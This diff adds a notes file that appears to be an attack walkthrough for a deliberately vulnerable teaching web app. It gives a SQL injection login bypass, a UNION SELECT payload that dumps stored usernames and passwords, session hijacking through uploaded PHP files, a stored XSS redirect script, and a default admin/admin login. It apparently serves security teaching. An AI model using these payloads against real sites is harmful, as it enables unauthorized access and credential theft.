@@ -1,0 +1,55 @@
+I'm writing here so content / formatting is done properly.
+
+1. SQL INJECTION (Please be aware of number of quotes.)
+
+a. Logging in with any username.
+
+Username: any in DB
+Password: ' or '1'='1
+
+
+b. Loggin in to show the username / password.
+
+Username: '  UNION SELECT '1', CONCAT(CONCAT(name, '-'), password), '', '' FROM students WHERE '1'='1
+
+Password: ' or '1'='1
+
+
+
+Then, you use one of the name - password combination shown at the snippets.
+
+When you log in, you will see id on url, remember that.
+
+
+2. XSS (Broken Authentication and Session Management)
+
+Then, upload upload_1.php (In the same directory), after which you will access using {webpage}/{id}/upload_1.php
+
+You will see all session being set. 
+
+Therefore, you create upload_2.php, which you upload and then you will gain:
+
+1. Administrative rights
+2. Different user (Poor Milhouse.)
+
+
+3. XSS (Cross Site Scripting)
+
+Simply, at the snippet, type:
+
+<script type="text/javascript">
+	alert("Express your inner anger!");
+	window.location.replace("http://localhost/SecureSimpsons/unsecure/login.php");
+</script>
+
+This will cause people to get redirected to the login url whenver they log in and look at the snippet.
+
+
+4. Insecure Direct Object References
+
+
+5. Security Misconfiguration
+
+Try to log in with:
+Username: admin
+Password: admin
